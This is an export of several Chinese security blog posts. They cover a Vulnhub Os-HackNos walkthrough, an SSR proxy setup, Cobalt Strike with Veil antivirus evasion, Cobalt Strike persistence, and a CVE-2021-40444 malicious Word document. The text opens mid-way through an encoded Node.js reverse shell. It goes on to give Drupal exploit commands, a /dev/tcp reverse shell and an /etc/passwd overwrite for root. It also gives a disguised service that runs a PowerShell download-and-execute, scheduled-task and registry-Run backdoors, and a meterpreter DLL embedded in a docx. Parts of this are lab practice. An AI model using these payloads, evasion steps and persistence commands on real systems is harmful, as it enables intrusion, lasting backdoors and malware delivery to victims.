110,116,46,115,111,99,107,101,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,32,105,102,32,40,116,121,112,101,111,102,32,117,116,105,108,46,112,117,109,112,32,61,61,61,32,34,117,110,100,101,102,105,110,101,100,34,41,32,123,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,125,32,101,108,115,101,32,123,32,117,116,105,108,46,112,117,109,112,40,115,104,46,115,116,100,111,117,116,44,32,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,117,116,105,108,46,112,117,109,112,40,115,104,46,115,116,100,101,114,114,44,32,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,125,32,125,41,59,32,115,111,99,107,101,116,46,111,110,40,34,101,114,114,111,114,34,44,32,102,117,110,99,116,105,111,110,40,101,114,114,111,114,41,32,123,32,99,111,117,110,116,101,114,43,43,59,32,105,102,40,99,111,117,110,116,101,114,60,61,32,49,48,41,123,32,115,101,116,84,105,109,101,111,117,116,40,102,117,110,99,116,105,111,110,40,41,32,123,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,59,125,44,32,53,42,49,48,48,48,41,59,32,125,32,101,108,115,101,32,112,114,111,99,101,115,115,46,101,120,105,116,40,41,59,32,125,41,59,32,125,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,59,32,125,41,40,41,59,49,43,49,59))&#39;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210922160353371.png" alt="image-20210922160353371"></p>
</blockquote>
<p>就可以得到一个shell，并且可以用sudo bash提权无需密码</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210922160449644.png" alt="image-20210922160449644"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】利用vps自建ssr代理上外网</title>
    <url>/posts/156.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>利用vps自建搭建vpn，一个人用，网速快</p>
</blockquote>
<h1 id="1、Vultr中建立国外vps"><a href="#1、Vultr中建立国外vps" class="headerlink" title="1、Vultr中建立国外vps"></a>1、Vultr中建立国外vps</h1><blockquote>
<p>注册和购买国外vps网站：<a href="https://my.vultr.com/" target="_blank" rel="noopener">https://my.vultr.com/</a></p>
</blockquote>
<p>一、当你花了10美元之后，在这里新建一个vps</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919202854859.png" alt=""></p>
</blockquote>
<p>二、先选<strong>Cloud Computer</strong>，然后用日本的位置就行，这服务器好像就是日本最快</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919202928106.png" alt=""></p>
</blockquote>
<p>三、用centos7x64的系统，其他全部默认</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919202950520.png" alt=""></p>
</blockquote>
<p>四、部署一下</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919203140126.png" alt=""></p>
</blockquote>
<p>五、查看登陆的账号和密码</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919203327172.png" alt=""></p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919203347386.png" alt=""></p>
<h1 id="2、利用vps搭建个人VPN"><a href="#2、利用vps搭建个人VPN" class="headerlink" title="2、利用vps搭建个人VPN"></a>2、利用vps搭建个人VPN</h1><p>一、用<strong>xshell</strong>登陆用刚刚的账号和密码，这个太基础了，就不说了，工具放在文章最后</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919203638106.png" alt=""></p>
</blockquote>
<p>二、用一个命令，给一个端口部署ssr</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">wget -N --no-check-certificate https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;ToyoDAdoubi&#x2F;doubi&#x2F;master&#x2F;ssr.sh &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh</span><br></pre></td></tr></table></figure></div>

<p>①选择1，安装，端口设置任意，我就选6666，密码为123456，其他全选默认，接着就获取了这个信息</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919203859233.png" alt=""></p>
</blockquote>
<p>三、这时，我们需要安装一个工具SSTap-beta-1.0.9.7，将其打开，工具放在文末，按+号添加一个<strong>ss/ssr代理</strong>，按照上面获得的信息进行配置，然后保存</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919204136769.png" alt=""></p>
</blockquote>
<p><strong>四、测试网速，一般网速在100ms-200ms之间，随时间变化而改变，正常访问外网没有问题</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919204230089.png" alt=""></p>
</blockquote>
<p>五、点击连接，就可以成功ssr代理了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919204334208.png" alt=""></p>
</blockquote>
<p>六，访问<a href="https://whoer.net/zh" target="_blank" rel="noopener">whoer</a>来确定自己是否成功挂上日本外网</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919204722425.png" alt=""></p>
</blockquote>
<h1 id="工具下载链接"><a href="#工具下载链接" class="headerlink" title="工具下载链接"></a>工具下载链接</h1><blockquote>
<p>链接: <a href="https://pan.baidu.com/s/1cvXgH7prZTen8JVcbs8w9Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1cvXgH7prZTen8JVcbs8w9Q</a> 提取码: pb1v</p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>VPN</tag>
        <tag>VPS</tag>
        <tag>SSR</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>【Vulnhub】靶机OS-HACKNOS</title>
    <url>/posts/145.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>第一次玩Vulnhub，只记录使用命令和一些感想，还有踩坑记录</li>
</ul>
</blockquote>
<h1 id="Os-HackNos-1配置"><a href="#Os-HackNos-1配置" class="headerlink" title="Os-HackNos-1配置"></a>Os-HackNos-1配置</h1><blockquote>
<p>首先介绍一下靶机，靶机是 vulnhub Os-hackNos-1</p>
<p>简介: 难度容易到中， flag 两个 一个是普通用户的user.txt 另外一个是root用户的user.txt</p>
<p>靶机的地址：<a href="https://www.vulnhub.com/entry/hacknos-os-hacknos,401/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/hacknos-os-hacknos,401/</a></p>
<p>有的靶机可能打开无法获取IP，我们需要使用方法来进入到靶机内，修改信息。</p>
</blockquote>
<p>1、导入到了虚拟机之后，会出现无法获取ip的情况，我们自己调，开启HackNos的同时连按shift键，按e进入页面</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919160755067.png" alt="image-20210919160755067"></p>
</blockquote>
<p>3、将这里的ro修改为rw single init=/bin/bash，然后按ctrl+x，进入root操作页面</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919160925088.png" alt="image-20210919160925088"></p>
</blockquote>
<p>4、查ip a发现查不到，记住网卡的名称ens33，准备修改配置信息</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919161030226.png" alt="image-20210919161030226"></p>
</blockquote>
<p>5、vim /etc/network/interfaces 看一下配置信息用的是哪一个网卡，把这两个都改成 ens33</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919161105212.png" alt="image-20210919161105212"></p>
</blockquote>
<p>6、然后/etc/init.d/networking restart 重启网卡服务  enp0s3</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919161139706.png" alt="image-20210919161139706"></p>
</blockquote>
<p>7、最后按ctrl+alt+del，进行重启，就ok了</p>
<h1 id="Os-HackNos-1开始"><a href="#Os-HackNos-1开始" class="headerlink" title="Os-HackNos-1开始"></a>Os-HackNos-1开始</h1><p>1、可以用两种方法确认靶场的存在，扫ip</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0&#x2F;24</span><br><span class="line">nmap -sn 192.168.1.0&#x2F;24</span><br></pre></td></tr></table></figure></div>

<p>2、扫目标端口开发情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -A 192.168.1.108</span><br></pre></td></tr></table></figure></div>

<p>3、扫目录情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.1.108&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-small.txt </span><br><span class="line"></span><br><span class="line">dirb http:&#x2F;&#x2F;10.0.2.4</span><br></pre></td></tr></table></figure></div>

<p>4、根据下载drupal的cms来试着看其版本</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.108&#x2F;drupal&#x2F;CHANGELOG.txt</span><br></pre></td></tr></table></figure></div>

<p>5、通过cms版本搜一下exp</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">CVE-2018-7600</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;pimps&#x2F;CVE-2018-7600</span><br></pre></td></tr></table></figure></div>

<p>6、有一个远程REC利用exp拿下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">python3 drupa7-CVE-2018-7600.py http:&#x2F;&#x2F;192.168.1.108&#x2F;drupal&#x2F; </span><br><span class="line">查看数据库</span><br><span class="line">python3 drupa7-CVE-2018-7600.py http:&#x2F;&#x2F;192.168.1.108&#x2F;drupal&#x2F; -c &quot;cd sites&#x2F;default;ls;cat settings.php&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">获得</span><br><span class="line">* Database configuration format:</span><br><span class="line"> * @code</span><br><span class="line"> *   $databases[&#39;default&#39;][&#39;default&#39;] &#x3D; array(</span><br><span class="line"> *     &#39;driver&#39; &#x3D;&gt; &#39;mysql&#39;,</span><br><span class="line"> *     &#39;database&#39; &#x3D;&gt; &#39;databasename&#39;,</span><br><span class="line"> *     &#39;username&#39; &#x3D;&gt; &#39;username&#39;,</span><br><span class="line"> *     &#39;password&#39; &#x3D;&gt; &#39;password&#39;,</span><br><span class="line"> *     &#39;host&#39; &#x3D;&gt; &#39;localhost&#39;,</span><br><span class="line"> *     &#39;prefix&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line"> *   );</span><br><span class="line"> *   $databases[&#39;default&#39;][&#39;default&#39;] &#x3D; array(</span><br><span class="line"> *     &#39;driver&#39; &#x3D;&gt; &#39;pgsql&#39;,</span><br><span class="line"> *     &#39;database&#39; &#x3D;&gt; &#39;databasename&#39;,</span><br><span class="line"> *     &#39;username&#39; &#x3D;&gt; &#39;username&#39;,</span><br><span class="line"> *     &#39;password&#39; &#x3D;&gt; &#39;password&#39;,</span><br><span class="line"> *     &#39;host&#39; &#x3D;&gt; &#39;localhost&#39;,</span><br><span class="line"> *     &#39;prefix&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line"> *   );</span><br><span class="line"> *   $databases[&#39;default&#39;][&#39;default&#39;] &#x3D; array(</span><br><span class="line"> *     &#39;driver&#39; &#x3D;&gt; &#39;sqlite&#39;,</span><br><span class="line"> *     &#39;database&#39; &#x3D;&gt; &#39;&#x2F;path&#x2F;to&#x2F;databasefilename&#39;,</span><br><span class="line"> *   );</span><br><span class="line"> * @endcode</span><br><span class="line"> *&#x2F;</span><br><span class="line">$databases &#x3D; array (</span><br><span class="line">  &#39;default&#39; &#x3D;&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#39;default&#39; &#x3D;&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#39;database&#39; &#x3D;&gt; &#39;cuppa&#39;,</span><br><span class="line">      &#39;username&#39; &#x3D;&gt; &#39;cuppauser&#39;,</span><br><span class="line">      &#39;password&#39; &#x3D;&gt; &#39;Akrn@4514&#39;,</span><br><span class="line">      &#39;host&#39; &#x3D;&gt; &#39;localhost&#39;,</span><br><span class="line">      &#39;port&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">      &#39;driver&#39; &#x3D;&gt; &#39;mysql&#39;,</span><br><span class="line">      &#39;prefix&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<p>也可以对其目录进行扫描</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.1.108&#x2F;drupal -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-small.txt</span><br><span class="line"></span><br><span class="line">dirsearch -u 192.168.1.108 -e*  -x 403</span><br></pre></td></tr></table></figure></div>

<p>7、利用python搭建服务器，让其下载木马，就可以上线webshell了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer </span><br><span class="line"></span><br><span class="line">python3 drupa7-CVE-2018-7600.py http:&#x2F;&#x2F;192.168.1.108&#x2F;drupal&#x2F; -c &quot;wget http:&#x2F;&#x2F;192.168.1.105:8000&#x2F;gylq.php&quot;</span><br></pre></td></tr></table></figure></div>

<p>8、反弹shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">bash -c &#39;exec bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.1.105&#x2F;6666 0&gt;&amp;1&#39;</span><br></pre></td></tr></table></figure></div>

<p>9、解密得出james:Hacker@451</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">echo &quot;KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA&#x3D;&#x3D;&quot; | base64 -d</span><br><span class="line">&lt;T4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA&#x3D;&#x3D;&quot; | base64 -d</span><br></pre></td></tr></table></figure></div>

<p>10、suid提权</p>
<p>利用制作一个ssl密码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt gylq 123456</span><br><span class="line">输出</span><br><span class="line">$1$gylq$&#x2F;LTjhHmiHp0tpo66ocv2e&#x2F;</span><br></pre></td></tr></table></figure></div>

<p>将其更改为下列形式，用wget替换</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">gylq:$1$gylq$&#x2F;LTjhHmiHp0tpo66ocv2e&#x2F;:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.1.105:8000&#x2F;passwd -O &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure></div>

<p>接着用su gylq来登陆就是root权限了</p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>【远控使用】Cobalt Strike中Veil免杀</title>
    <url>/posts/144.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Cobalt Strike的基础使用</li>
</ul>
</blockquote>
<p>首先生成一个payload.txt</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919093058877.png" alt="image-20210919093058877"></p>
</blockquote>
<h1 id="Veil的使用"><a href="#Veil的使用" class="headerlink" title="Veil的使用"></a>Veil的使用</h1><blockquote>
<p>Veil的下载<a href="https://github.com/Veil-Framework/Veil" target="_blank" rel="noopener">https://github.com/Veil-Framework/Veil</a></p>
<p>目前好像可以免杀360</p>
</blockquote>
<p>1、安装好之后的样式</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919092845286.png" alt="image-20210919092845286"></p>
</blockquote>
<p>2、使用Evasion</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919092926463.png" alt="image-20210919092926463"></p>
</blockquote>
<p>3、使用list列出模块</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919092943812.png" alt="image-20210919092943812"></p>
</blockquote>
<p>4、使用17的模块免杀</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919093012995.png" alt="image-20210919093012995"></p>
</blockquote>
<p>5、选择用户自定义免杀</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919093029780.png" alt="image-20210919093029780"></p>
</blockquote>
<p><strong>6、可以再该路径中找到生成的exe文件/var/lib/veil/output/compiled/cc.exe，其中cc为设置的base name</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919093240322.png" alt="image-20210919093240322"></p>
</blockquote>
<blockquote>
<p>运行cc.exe就可以上线</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210919093325262.png" alt="image-20210919093325262"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>【远控使用】Cobalt Strike可持续后门的使用</title>
    <url>/posts/143.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Cobalt Strike的基础使用</li>
</ul>
</blockquote>
<h1 id="一、服务器自启动配置"><a href="#一、服务器自启动配置" class="headerlink" title="一、服务器自启动配置"></a>一、服务器自启动配置</h1><p><strong>1、创建服务</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell sc create &quot;Windows Power&quot; binpath&#x3D; &quot;cmd &#x2F;c start powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.43.22:80&#x2F;a&#39;))\&quot;&quot;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210917161311565.png" alt=""></p>
</blockquote>
<p><strong>2、设置服务会自动启动</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">shell sc config "Windows Power" start= auto</span><br><span class="line">shell sc description "Windows Power" "Windows auto service" #描述</span><br><span class="line">shell sc start "Windows Power"   #来启动</span><br><span class="line">shell net start Windows Power</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210917162326216.png" alt=""></p>
<p>会被防火墙拦截，也可以换个木马执行</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210917162510909.png" alt="image-20210917162510909"></p>
</blockquote>
<h1 id="二、计划任务"><a href="#二、计划任务" class="headerlink" title="二、计划任务"></a>二、计划任务</h1><p>1、创建任务</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell schtasks &#x2F;create &#x2F;tn &quot;windowsup&quot; &#x2F;tr &quot;C:\artifact.exe&quot; &#x2F;ru SYSTEM &#x2F;sc onstart</span><br></pre></td></tr></table></figure></div>

<p>2、修改字符集和查询</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">chcp 437 </span><br><span class="line">shell schtasks &#x2F;query &#x2F;tn windowsup</span><br></pre></td></tr></table></figure></div>

<p>3、启动</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell schtasks &#x2F;run &#x2F;tn windowsup</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210917164534933.png" alt="image-20210917164534933"></p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210917165216574.png" alt="image-20210917165216574"></p>
<p>4、删除计划</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell schtasks &#x2F;delete &#x2F;tn windowsup</span><br></pre></td></tr></table></figure></div>

<h1 id="三、注册表启动"><a href="#三、注册表启动" class="headerlink" title="三、注册表启动"></a>三、注册表启动</h1><p>系统启动时，就会执行木马</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run &#x2F;v &quot;Keyname&quot; &#x2F;t REG_SZ &#x2F;d &quot;C:\artifact.exe&quot; &#x2F;f</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210917170307071.png" alt="image-20210917170307071"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>【漏洞复现】Microsoft文档CVE-2021-40444</title>
    <url>/posts/142.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>恶意 docx 生成器利用 CVE-2021-40444（Microsoft Office Word 远程代码执行）</li>
</ul>
<p><strong>测试环境</strong></p>
<ul>
<li>windows 10</li>
<li>Office 2019word</li>
<li>kali</li>
</ul>
</blockquote>
<h1 id="简单复现exp方法"><a href="#简单复现exp方法" class="headerlink" title="简单复现exp方法"></a>简单复现exp方法</h1><p><strong>一、这个需要一个依赖lcab</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">apt-get install lcab</span><br></pre></td></tr></table></figure></div>

<p><strong>二、这个exp中是利用dll的，所以我们生成一个后门，这里用80以外的端口就行</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">use payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line"></span><br><span class="line">接着生成为dll形式</span><br><span class="line">generate -f dll -o http.dll</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210916183359206.png" alt="image-20210916183359206"></p>
</blockquote>
<p><strong>三、exp生成攻击word文档</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">python3 exploit.py generate http.dll http:&#x2F;&#x2F;192.168.1.104</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210916174436033.png" alt="image-20210916174436033"></p>
</blockquote>
<p><strong>四、接着在你kali上使用exp来监听mhtml会访问的80端口</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210916180330837.png" alt="image-20210916180330837"></p>
